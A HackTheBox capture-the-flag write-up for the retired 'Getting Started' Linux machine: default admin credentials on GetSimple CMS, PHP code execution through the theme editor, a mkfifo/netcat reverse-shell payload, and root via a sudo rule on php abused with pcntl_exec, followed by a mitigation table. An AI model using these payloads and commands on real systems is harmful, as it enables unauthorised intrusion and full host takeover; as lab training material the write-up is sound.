# Getting Started — HackTheBox

**Platform:** HackTheBox
**Machine:** Getting Started
**Difficulty:** Easy
**OS:** Linux
**Date:** 24/07/2026
**Tags:** #enum #foothold #privesc #getsimplecms #sudo-misconfig
**Status:** Retired ✅ (published in compliance with HTB's ToS)

## TL;DR

Initial access abuses **unchanged default credentials** (`admin:admin`) on an exposed **GetSimple CMS** instance. The admin panel allows directly editing the active theme's PHP file with no content validation whatsoever — which is arbitrary code execution by design for any authenticated user, and consequently yields a reverse shell as `www-data`.

Privilege escalation was trivial: `sudo -l` revealed a `NOPASSWD` entry granting `www-data` the ability to run `/usr/bin/php` as root. Since PHP isn't on any "safe" list of sudo-able binaries and exposes multiple process-execution primitives, abusing it via `pcntl_exec()` (documented on GTFOBins) produced an immediate root shell.

**Attack chain:** Default credentials on exposed CMS → Theme editor with no sandbox (RCE) → Reverse shell (www-data) → Overly permissive sudo rule (`NOPASSWD: /usr/bin/php`) → root

---

## 1. Recon

### 1.1 Port scan

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 14:32 -0300
Nmap scan report for 10.129.88.109
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two open ports: SSH (22) and HTTP (Apache 2.4.41). The page title and `robots.txt` already give away the CMS (**GetSimple**) and a protected path (`/admin/`), pointing the web enumeration in the right direction.

### 1.2 Web service enumeration

```
gobuster dir -u http://10.129.88.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o check.txt

.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
admin                (Status: 301) [Size: 314] [--> http://10.129.88.109/admin/]
backups              (Status: 301) [Size: 316] [--> http://10.129.88.109/backups/]
data                 (Status: 301) [Size: 313] [--> http://10.129.88.109/data/]
index.php            (Status: 200) [Size: 5485]
plugins              (Status: 301) [Size: 316] [--> http://10.129.88.109/plugins/]
robots.txt           (Status: 200) [Size: 32]
server-status        (Status: 403) [Size: 278]
sitemap.xml          (Status: 200) [Size: 431]
theme                (Status: 301) [Size: 314] [--> http://10.129.88.109/theme/]
```

Typical **GetSimple CMS** install layout, exposed at the site root (`/`) with no subfolder — a relevant detail later on, since Metasploit tried (and failed) to authenticate against the module's default `TARGETURI`, which assumes a path like `/GetSimpleCMS`.

Hitting `/admin/`, I tried the CMS's default credentials: **`admin:admin`** — authentication succeeded. A default credential still active in production/CTF, with no forced password change on first login.

---

## 2. Foothold

### 2.1 RCE via the theme editor

GetSimple's admin panel exposes a theme editor that lets you directly modify PHP files served by the application — with no content validation. I tested this by inserting a simple payload into the active template file:

```php
<?php system('id'); ?>
```

Requesting `http://gettingstarted.htb/theme/Cardinal/template.php`, the server returned:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Arbitrary code execution as `www-data` confirmed.

### 2.2 Reverse shell

I replaced the template's content with a reverse shell payload:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.161 9443 >/tmp/f"); ?>
```

With a listener running (`nc -lvnp 9443`) and a request to the modified template, I got the initial shell:

```
$ whoami
www-data
```

The shell was stabilized with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 2.3 Post-exploitation enumeration and user flag

```
$ cd /home
$ ls
mrb3n
$ cat /home/mrb3n/user.txt
7002d65b...21d8
```

**User flag captured.**

---

## 3. Privilege escalation

### 3.1 Sudo enumeration

```
$ sudo -l
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

The `www-data` user can run `/usr/bin/php` as any user (including root), with no password. PHP isn't on any list of "safe" binaries for sudo rules and has multiple command/process execution primitives — a well-documented abuse on GTFOBins ([gtfobins.github.io/gtfobins/php](https://gtfobins.github.io/gtfobins/php/)).

### 3.2 Exploitation

```bash
sudo php -r "pcntl_exec('/bin/sh', ['-p']);"
```

```
$ whoami
root
```

**Technical root cause:** `pcntl_exec()` replaces the current PHP process image with the given binary (`/bin/sh`), inheriting the parent process's effective UID — in this case, root via sudo. The `-p` flag preserves privileges in the resulting shell.

### 3.3 Root flag

```
root@gettingstarted:~# cat root.txt
f1fba6e9...7842
```

**Root flag captured.**

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | Active default credentials | `admin:admin` never changed after CMS install, no forced password change policy | Enforce credential changes on first login; minimum password policies; flag default credentials in hardening tooling |
| 2 | RCE via theme editor | GetSimple's theme editor allows direct writes of executable PHP, with no sandbox, extension restriction, or content review | Disable editing executable files from the panel; separate the theme directory from the publicly served directory; validate/filter submitted content |
| 3 | Overly permissive sudo rule | `sudoers` grants `NOPASSWD` for `/usr/bin/php`, a binary with command-execution functions (`system`, `exec`, `pcntl_exec`) | Never grant unrestricted sudo to general-purpose language interpreters; if required, use wrappers with a restrictive `disable_functions` set, or allow only specific scripts by absolute path |

---

## 5. Lessons learned

- Always confirm an application's actual `TARGETURI` before assuming a Metasploit module's default path — GetSimple here lived at the site root, not `/GetSimpleCMS`, which would have made any automated module silently fail authentication.
- Admin panels with file-editing capability (themes, plugins, uploads) are a recurring RCE vector in legacy CMSs — always worth testing that surface right after gaining authenticated access.
- `sudo -l` should be the first command run after any foothold; misconfigured sudo rules for interpreters (PHP, Python, Perl, etc.) are trivial to abuse via GTFOBins.
- Default credentials remain, in practice, one of the most common initial access vectors even on services exposed to the internet — always worth testing before moving on to more complex exploits.
